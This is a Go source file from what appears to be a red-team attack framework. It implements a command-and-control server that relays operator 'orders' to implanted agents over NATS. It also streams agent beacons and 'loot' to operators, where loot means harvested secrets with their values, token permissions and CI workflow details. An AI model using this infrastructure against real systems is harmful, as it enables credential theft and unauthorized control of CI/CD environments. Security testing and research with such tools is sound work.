// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package kitchen implements the C2 server (HTTP-to-NATS bridge).
package kitchen

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"

	"github.com/boostsecurityio/smokedmeat/internal/kitchen/db"
	"github.com/boostsecurityio/smokedmeat/internal/models"
	"github.com/boostsecurityio/smokedmeat/internal/pass"
)

// OperatorMessage represents a WebSocket message between Counter and Kitchen.
type OperatorMessage struct {
	Type string `json:"type"`

	// For "order" type
	Order *models.Order `json:"order,omitempty"`

	// For "beacon" type
	Beacon *BeaconPayload `json:"beacon,omitempty"`

	// For "coleslaw" type
	Coleslaw *models.Coleslaw `json:"coleslaw,omitempty"`

	// For "event" type
	Event *EventPayload `json:"event,omitempty"`

	// For "history" type
	History *HistoryPayload `json:"history,omitempty"`

	// For "express_data" type
	ExpressData *ExpressDataPayload `json:"express_data,omitempty"`

	// For "analysis_progress" type
	AnalysisProgress *AnalysisProgressPayload `json:"analysis_progress,omitempty"`

	// For "analysis_metadata_sync" type
	AnalysisMetadataSync *AnalysisMetadataSyncPayload `json:"analysis_metadata_sync,omitempty"`

	// For "loot_sync" type
	LootSync *LootSyncPayload `json:"loot_sync,omitempty"`

	// For "error" type
	Error string `json:"error,omitempty"`
}

// HistoryPayload represents operation history data sent to operators.
type HistoryPayload struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	Timestamp time.Time `json:"timestamp"`
	SessionID string    `json:"session_id,omitempty"`

	Target     string `json:"target,omitempty"`
	TargetType string `json:"target_type,omitempty"`
	TokenType  string `json:"token_type,omitempty"`

	VulnID     string `json:"vuln_id,omitempty"`
	Repository string `json:"repository,omitempty"`
	StagerID   string `json:"stager_id,omitempty"`
	PRURL      string `json:"pr_url,omitempty"`

	Outcome     string `json:"outcome,omitempty"`
	ErrorDetail string `json:"error_detail,omitempty"`
	AgentID     string `json:"agent_id,omitempty"`
}

type AnalysisProgressPayload struct {
	AnalysisID     string    `json:"analysis_id,omitempty"`
	SessionID      string    `json:"session_id,omitempty"`
	Target         string    `json:"target,omitempty"`
	TargetType     string    `json:"target_type,omitempty"`
	Deep           bool      `json:"deep,omitempty"`
	Phase          string    `json:"phase"`
	Message        string    `json:"message,omitempty"`
	CurrentRepo    string    `json:"current_repo,omitempty"`
	ReposCompleted int       `json:"repos_completed,omitempty"`
	ReposTotal     int       `json:"repos_total,omitempty"`
	SecretFindings int       `json:"secret_findings,omitempty"`
	StartedAt      time.Time `json:"started_at,omitempty"`
	UpdatedAt      time.Time `json:"updated_at,omitempty"`
}

type AnalysisMetadataSyncPayload struct {
	AnalysisID string    `json:"analysis_id,omitempty"`
	SessionID  string    `json:"session_id,omitempty"`
	Target     string    `json:"target,omitempty"`
	TargetType string    `json:"target_type,omitempty"`
	Status     string    `json:"status"`
	Message    string    `json:"message,omitempty"`
	ReposTotal int       `json:"repos_total,omitempty"`
	Error      string    `json:"error,omitempty"`
	UpdatedAt  time.Time `json:"updated_at,omitempty"`
}

type LootSyncPayload struct {
	Entries []LootSyncEntry `json:"entries"`
}

type LootSyncEntry struct {
	SessionID string    `json:"session_id,omitempty"`
	AgentID   string    `json:"agent_id,omitempty"`
	Hostname  string    `json:"hostname,omitempty"`
	Timestamp time.Time `json:"timestamp"`
	Origin    string    `json:"origin,omitempty"`

	Name      string `json:"name"`
	Value     string `json:"value"`
	Type      string `json:"type"`
	Source    string `json:"source"`
	HighValue bool   `json:"high_value"`

	Repository string `json:"repository,omitempty"`
	Workflow   string `json:"workflow,omitempty"`
	Job        string `json:"job,omitempty"`

	TokenPermissions map[string]string `json:"token_permissions,omitempty"`
}

// BeaconPayload represents agent beacon data sent to operators.
type BeaconPayload struct {
	AgentID       string     `json:"agent_id"`
	SessionID     string     `json:"session_id,omitempty"`
	Hostname      string     `json:"hostname,omitempty"`
	OS            string     `json:"os,omitempty"`
	Arch          string     `json:"arch,omitempty"`
	Timestamp     time.Time  `json:"timestamp"`
	DwellDeadline *time.Time `json:"dwell_deadline,omitempty"`
	CallbackID    string     `json:"callback_id,omitempty"`
	CallbackMode  string     `json:"callback_mode,omitempty"`
}

// EventPayload represents system events sent to operators.
type EventPayload struct {
	Type      string    `json:"type"` // agent_connected, agent_disconnected, order_delivered, etc.
	AgentID   string    `json:"agent_id,omitempty"`
	SessionID string    `json:"session_id,omitempty"`
	OrderID   string    `json:"order_id,omitempty"`
	Message   string    `json:"message,omitempty"`
	Timestamp time.Time `json:"timestamp"`
}

// OperatorHub manages WebSocket connections from Counter operators.
type OperatorHub struct {
	mu        sync.RWMutex
	operators map[*OperatorConn]bool
	publisher *pass.Publisher
	store     *OrderStore
	database  *db.DB
}

// OperatorConn represents a connected operator.
type OperatorConn struct {
	conn      *websocket.Conn
	sessionID string
	send      chan OperatorMessage
	hub       *OperatorHub
}

// NewOperatorHub creates a new operator hub.
func NewOperatorHub(publisher *pass.Publisher, store *OrderStore, database *db.DB) *OperatorHub {
	return &OperatorHub{
		operators: make(map[*OperatorConn]bool),
		publisher: publisher,
		store:     store,
		database:  database,
	}
}

// HandleWebSocket handles WebSocket connections from Counter operators.
func (h *OperatorHub) HandleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := websocket.Accept(w, r, nil)
	if err != nil {
		slog.Error("failed to accept websocket", "error", err)
		return
	}

	// Get session ID from query param (optional)
	sessionID := r.URL.Query().Get("session")

	op := &OperatorConn{
		conn:      conn,
		sessionID: sessionID,
		send:      make(chan OperatorMessage, 256),
		hub:       h,
	}

	h.register(op)
	defer h.unregister(op)

	// Start writer goroutine
	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	go op.writePump(ctx)
	op.readPump(ctx)
}

// register adds an operator to the hub.
func (h *OperatorHub) register(op *OperatorConn) {
	h.mu.Lock()
	h.operators[op] = true
	total := len(h.operators)
	h.mu.Unlock()

	slog.Info("operator connected", "session_id", op.sessionID, "total", total)

	if h.database != nil {
		go h.sendStoredLoot(op)
	}
}

func (h *OperatorHub) sendStoredLoot(op *OperatorConn) {
	lootRepo := db.NewLootRepository(h.database)
	lootRows, err := lootRepo.List()
	if err != nil {
		slog.Warn("failed to fetch stored loot", "error", err)
		return
	}

	if len(lootRows) == 0 {
		return
	}

	slog.Info("sending stored loot to operator", "count", len(lootRows), "session_id", op.sessionID)
	payload := LootSyncPayload{Entries: make([]LootSyncEntry, 0, len(lootRows))}
	for _, row := range lootRows {
		payload.Entries = append(payload.Entries, LootSyncEntry{
			SessionID:        row.SessionID,
			AgentID:          row.AgentID,
			Hostname:         row.Hostname,
			Timestamp:        row.Timestamp,
			Origin:           row.Origin,
			Name:             row.Name,
			Value:            row.Value,
			Type:             row.Type,
			Source:           row.Source,
			HighValue:        row.HighValue,
			Repository:       row.Repository,
			Workflow:         row.Workflow,
			Job:              row.Job,
			TokenPermissions: row.TokenPermissions,
		})
	}

	select {
	case op.send <- OperatorMessage{
		Type:     "loot_sync",
		LootSync: &payload,
	}:
	default:
		slog.Warn("operator send buffer full during loot sync", "session_id", op.sessionID)
	}
}

// unregister removes an operator from the hub.
func (h *OperatorHub) unregister(op *OperatorConn) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if _, ok := h.operators[op]; ok {
		delete(h.operators, op)
		close(op.send)
	}
	slog.Info("operator disconnected", "session_id", op.sessionID, "total", len(h.operators))
}

// Broadcast sends a message to all connected operators.
func (h *OperatorHub) Broadcast(msg OperatorMessage) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	for op := range h.operators {
		select {
		case op.send <- msg:
		default:
			// Channel full, skip this operator
			slog.Warn("operator send buffer full, dropping message", "session_id", op.sessionID)
		}
	}
}

func (h *OperatorHub) broadcastToSession(sessionID string, msg OperatorMessage) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	for op := range h.operators {
		if sessionID != "" && op.sessionID != sessionID {
			continue
		}
		select {
		case op.send <- msg:
		default:
			slog.Warn("operator send buffer full, dropping message", "session_id", op.sessionID)
		}
	}
}

// BroadcastBeacon sends a beacon to all operators.
func (h *OperatorHub) BroadcastBeacon(beacon BeaconPayload) {
	h.Broadcast(OperatorMessage{
		Type:   "beacon",
		Beacon: &beacon,
	})
}

// BroadcastColeslaw sends a coleslaw response to all operators.
func (h *OperatorHub) BroadcastColeslaw(coleslaw *models.Coleslaw) {
	h.Broadcast(OperatorMessage{
		Type:     "coleslaw",
		Coleslaw: coleslaw,
	})
}

// BroadcastEvent sends an event to all operators.
func (h *OperatorHub) BroadcastEvent(event EventPayload) {
	h.Broadcast(OperatorMessage{
		Type:  "event",
		Event: &event,
	})
}

// BroadcastHistory sends a history entry to all operators.
func (h *OperatorHub) BroadcastHistory(history HistoryPayload) {
	h.Broadcast(OperatorMessage{
		Type:    "history",
		History: &history,
	})
}

// BroadcastExpressData sends express mode secrets to all operators.
func (h *OperatorHub) BroadcastExpressData(data ExpressDataPayload) {
	h.Broadcast(OperatorMessage{
		Type:        "express_data",
		ExpressData: &data,
	})
}

func (h *OperatorHub) BroadcastAnalysisProgress(progress AnalysisProgressPayload) {
	h.broadcastToSession(progress.SessionID, OperatorMessage{
		Type:             "analysis_progress",
		AnalysisProgress: &progress,
	})
}

func (h *OperatorHub) BroadcastAnalysisMetadataSync(payload AnalysisMetadataSyncPayload) {
	h.broadcastToSession(payload.SessionID, OperatorMessage{
		Type:                 "analysis_metadata_sync",
		AnalysisMetadataSync: &payload,
	})
}

// readPump reads messages from the WebSocket connection.
func (op *OperatorConn) readPump(ctx context.Context) {
	defer op.conn.Close(websocket.StatusNormalClosure, "")

	for {
		var msg OperatorMessage
		err := wsjson.Read(ctx, op.conn, &msg)
		if err != nil {
			if websocket.CloseStatus(err) != websocket.StatusNormalClosure {
				slog.Debug("websocket read error", "error", err)
			}
			return
		}

		op.handleMessage(ctx, msg)
	}
}

// writePump writes messages to the WebSocket connection.
func (op *OperatorConn) writePump(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case msg, ok := <-op.send:
			if !ok {
				return
			}
			if err := wsjson.Write(ctx, op.conn, msg); err != nil {
				slog.Debug("websocket write error", "error", err)
				return
			}
		}
	}
}

// handleMessage processes incoming messages from operators.
func (op *OperatorConn) handleMessage(ctx context.Context, msg OperatorMessage) {
	switch msg.Type {
	case "order":
		op.handleOrder(ctx, msg.Order)
	case "ping":
		op.send <- OperatorMessage{Type: "pong"}
	default:
		slog.Warn("unknown message type", "type", msg.Type)
	}
}

// handleOrder processes an order from an operator.
func (op *OperatorConn) handleOrder(ctx context.Context, order *models.Order) {
	if order == nil {
		op.sendError("order is required")
		return
	}

	if order.AgentID == "" {
		op.sendError("agent_id is required")
		return
	}

	// Set session ID if not provided
	if order.SessionID == "" {
		order.SessionID = op.sessionID
	}

	// Generate order ID if not provided
	if order.OrderID == "" {
		order.OrderID = fmt.Sprintf("ord_%d", time.Now().UnixNano())
	}

	// Marshal and publish to NATS
	data, err := json.Marshal(order)
	if err != nil {
		slog.Error("failed to marshal order", "order_id", order.OrderID, "error", err)
		op.sendError("failed to process order")
		return
	}

	if err := op.hub.publisher.PublishOrder(ctx, order.AgentID, data); err != nil {
		slog.Error("failed to publish order", "order_id", order.OrderID, "agent_id", order.AgentID, "error", err)
		op.sendError("failed to deliver order")
		return
	}

	slog.Debug("order published via websocket", "order_id", order.OrderID, "agent_id", order.AgentID)

	// Send confirmation
	op.send <- OperatorMessage{
		Type: "event",
		Event: &EventPayload{
			Type:      "order_sent",
			OrderID:   order.OrderID,
			AgentID:   order.AgentID,
			Timestamp: time.Now(),
		},
	}
}

// sendError sends an error message to the operator.
func (op *OperatorConn) sendError(message string) {
	op.send <- OperatorMessage{
		Type:  "error",
		Error: message,
	}
}
